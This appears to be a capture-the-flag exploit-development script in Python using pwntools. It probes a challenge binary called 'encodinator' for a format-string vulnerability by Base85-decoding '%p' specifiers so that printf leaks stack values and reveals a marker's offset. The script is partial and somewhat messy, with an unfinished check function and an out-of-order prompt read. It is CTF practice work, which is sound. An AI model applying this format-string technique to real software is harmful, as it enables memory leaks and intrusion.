from pwn import *
import sys
import base64

# Configuration
BINARY = 'challenges/pwn/encodinator/files/dist/encodinator'
context.binary = BINARY

def check_base85():
    # Test 1: Standard encoding
    p = process(BINARY)
    p.recvuntil(b"text: ")
    p.send(b"AAAA") # 4 bytes
    p.recvline() # "I will..."
    # The output is directly printed by printf(format)
    # The binary prints a newline before printf(format) via putchar(10)
    # So we should see: \n<EncodedOutput><Footer>
    try:
        resp = p.recvuntil(b"\nGood luck", drop=True) # byte_402076 is "Good luck out there!" or similar?
        # Let's just recvall for a bit
    except:
        pass
    p.close()

def find_offset():
    # Construct a format string probe that is VALID shellcode or at least passes encoding
    # We want format buffer to contain: %p %p %p ...
    # So input should be Base85Decode("%p %p %p ...")
    
    # Payload characters must be valid Base85.
    # % p are valid. Space is valid.
    target_str = b"%p." * 40
    # Decode it to get the input we should send
    # Note: target_str length must be multiple of 5 for clean decoding? 
    # Or we pad.
    # Append <~ ~> for python's decoder if using adobe=True, or use standard
    try:
        # Python's a85decode with adobe=True expects <~...~>
        # We wrapped in try/except but failed because input didn't have tags.
        # Let's add them.
        payload = base64.a85decode(b"<~" + target_str + b"~>", adobe=True)
    except Exception as e:
        print(f"Decoding failed: {e}")
        # Manual fallback or padding
        # Pad with 'u' to make length multiple of 5
        while len(target_str) % 5 != 0:
            target_str += b'u'
        payload = base64.a85decode(b"<~" + target_str + b"~>", adobe=True)
    
    # Append a marker at the end of input to identify it in stack
    # We want to see where 'buf' is.
    # If we append raw marker bytes at the end of payload.
    # But wait, base85_encode will consume them and encode them.
    # We want to see the RAW stack.
    # The 'buf' on stack contains valid raw bytes we sent.
    
    # So if we send: [Payload] [MARKER]
    # 'buf' contains [Payload][MARKER]
    # 'format' contains "%p %p ... " + Encoded(MARKER)
    # printf(format) will print stack values.
    # We look for MARKER (e.g. 0xdeadbeef) in the printed values.
    
    marker = b"DEADBEEF"
    full_payload = payload + marker
    
    p = process(BINARY)
    p.send(full_payload)
    p.recvuntil(b"text: ") # consumed earlier? No, send after prompt
    
    # Read output
    # Skip preamble
    # The output will be the executed format string
    response = p.recvall(timeout=1)
    print(f"Response: {response}")
    
    # Look for DEADBEEF or 44454144
    if b"44454144" in response or b"efbeadde" in response:
        print("Marker found!")
    else:
        print("Marker not obvious.")

if __name__ == "__main__":
    # check_base85()
    find_offset()
